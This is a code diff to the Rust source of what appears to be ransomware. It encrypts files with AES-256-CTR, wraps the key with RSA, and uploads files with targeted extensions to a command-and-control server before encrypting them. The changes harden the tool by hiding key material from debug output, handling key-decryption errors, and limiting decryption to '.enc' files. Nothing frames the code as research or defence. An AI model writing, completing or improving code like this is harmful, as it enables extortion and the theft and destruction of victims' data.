@@ -14,7 +14,7 @@ use walkdir::WalkDir;
 use std::{
     fmt::Error as FmtError,
     fs::{remove_file, File, OpenOptions},
-    io::{BufReader, Read, Write, Seek, SeekFrom},
+    io::{BufReader, Read, Seek, SeekFrom, Write},
     path::{Path, PathBuf},
     sync::mpsc::{channel, Sender},
     thread::{self, JoinHandle},
@@ -29,12 +29,6 @@ fn aes_256_ctr_encrypt_decrypt(ctext: &mut [u8], key: &[u8], nonce: &[u8]) -> Re
 
     let mut cipher = Aes256Ctr::new(key.into(), (nonce).into());
 
-    println!(
-        "Encrypting/decrypting... data len: {}, key: {:?}, nonce: {:?}",
-        ctext.len(),
-        key,
-        nonce
-    );
     cipher.apply_keystream(ctext);
 
     Ok(())
@@ -172,7 +166,7 @@ pub fn encrypt_decrypt_file(
             let mut tmp_buffer: Vec<u8> = vec![0; size_of_enc_key];
             let private_key = RsaPrivateKey::from_pkcs1_pem(&private_public_key).unwrap();
 
-            match tmp_buf_reader.read(&mut tmp_buffer[..]) {
+            let bytes = match tmp_buf_reader.read(&mut tmp_buffer[..]) {
                 Ok(bytes) => bytes,
                 Err(_) => {
                     return Err(FileEncryptionDecryptionError::ErrorSrcFile(String::from(
@@ -180,9 +174,17 @@ pub fn encrypt_decrypt_file(
                     )))
                 }
             };
+            println!("{}", bytes);
+            let key_vec = match private_key.decrypt(Pkcs1v15Encrypt, &tmp_buffer) {
+                Ok(key) => key,
+                Err(_) => {
+                    return Err(FileEncryptionDecryptionError::ErrorSrcFile(String::from(
+                        "Could not read decryption key from file",
+                    )))
+                }
+            };
 
-            key = String::from_utf8(private_key.decrypt(Pkcs1v15Encrypt, &tmp_buffer).unwrap())
-                .unwrap();
+            key = String::from_utf8(key_vec).unwrap();
         }
     }
 
@@ -190,7 +192,11 @@ pub fn encrypt_decrypt_file(
     let mut total_read_bytes: usize = 0;
     let mut counter = [0u8; 16];
 
-    if is_encryption != 1{ buf_reader.seek(SeekFrom::Start(size_of_enc_key as u64)).unwrap();}
+    if is_encryption != 1 {
+        buf_reader
+            .seek(SeekFrom::Start(size_of_enc_key as u64))
+            .unwrap();
+    }
 
     loop {
         let bytes_read = match buf_reader.read(&mut buffer[..]) {
@@ -276,9 +282,9 @@ pub fn multi_threaded_encrypt_decrypt_files(
                     if path.to_str().unwrap() == "_END_SEARCH_" {
                         break;
                     }
-                    if is_encryption == 1 {
-                        if let Some(extension) = path.extension() {
-                            if let Some(extension_str) = extension.to_str() {
+                    if let Some(extension) = path.extension() {
+                        if let Some(extension_str) = extension.to_str() {
+                            if is_encryption == 1 {
                                 if extensions.contains(&extension_str) {
                                     match c2.upload_file(
                                         path.to_string_lossy().to_string(),
@@ -287,18 +293,22 @@ pub fn multi_threaded_encrypt_decrypt_files(
                                         _ => (),
                                     };
                                 }
+                            } else {
+                                if extension_str != "enc" {
+                                    continue;
+                                }
                             }
                         }
-                    }
 
-                    match encrypt_decrypt_file(
-                        path.to_str().unwrap(),
-                        private_public_key_clone.clone(),
-                        is_encryption,
-                    ) {
-                        Ok(bytes_read) => bytes_read,
-                        Err(_) => 0,
-                    };
+                        match encrypt_decrypt_file(
+                            path.to_str().unwrap(),
+                            private_public_key_clone.clone(),
+                            is_encryption,
+                        ) {
+                            Ok(bytes_read) => bytes_read,
+                            Err(_) => 0,
+                        };
+                    }
                 }
                 Err(_) => break,
             }
